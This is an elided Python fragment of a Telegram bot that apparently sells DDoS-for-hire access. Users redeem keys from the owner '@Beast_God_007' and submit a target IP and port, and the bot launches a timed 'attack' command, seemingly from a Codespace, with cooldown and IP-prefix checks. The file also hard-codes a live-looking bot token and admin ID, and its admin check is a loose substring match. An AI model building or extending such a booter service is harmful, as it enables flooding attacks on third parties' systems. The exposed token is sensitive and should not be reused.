...
BOT_TOKEN = "8136960549:AAFFtm-zZPU63QJw7xmzN49S7JMZmsFQCcM"
ADMIN_IDS = "1966645091"
...
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS  # Convert user_id to string
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    ...
    try:
        ...
        output = stdout.decode().replace("", "@Beast_God_007")  # Replace with your name
        error = stderr.decode()
...
def process_attack_command(message, chat_id):
    try:
        ...
        # Ensure we have 2 arguments (IP and port), since duration is predefined
        if len(args) != 2:
        ...
        # Validate IP address prefix
        if not any(target_ip.startswith(prefix) for prefix in valid_ip_prefixes):
            bot.send_message(chat_id, "⚠️ Invalid IP address! IP must start with one of the following: 52., 20., 14., 4., or 13.", parse_mode='Markdown')
            return
        ...
        if (chat_id, target_ip, target_port) in user_attacks:
            bot.send_message(chat_id, "❌ You have already attacked this IP and port combination!", parse_mode='Markdown')
            return

        # Check if the user is on cooldown
        current_time = time.time()
        last_attack_time = user_last_attack_time.get(chat_id, 0)

        if current_time - last_attack_time < attack_cooldown:
            wait_time = attack_cooldown - (current_time - last_attack_time)
            bot.send_message(chat_id, f"⏳ Please wait {int(wait_time)} seconds before attacking again.", parse_mode='Markdown')
            return

        # Record the attack
        user_attacks[(chat_id, target_ip, target_port)] = True
        user_last_attack_time[chat_id] = current_time  # Update the last attack time

        # Run the attack command asynchronously with predefined duration
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @Beast_God_007"  
...
def send_welcome(message):
    ...
    welcome_message = (f"Welcome, {username}! To @Beast_God_007\n\n"
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem A key To Owner:- @Beast_God_007*", parse_mode='Markdown')
        return

    # Check if the user's key is still valid
    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*Your key has expired. Please redeem A key To Owner:- @Beast_God_007.*", parse_mode='Markdown')
        return
    ...
    if found_user:
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = ("Your key has expired. Please redeem a new key.\n"
                            "Contact @Beast_God_007 for assistance.")
        else:
        ...
        account_info = "Please redeem A key To Owner:- @Beast_God_007."
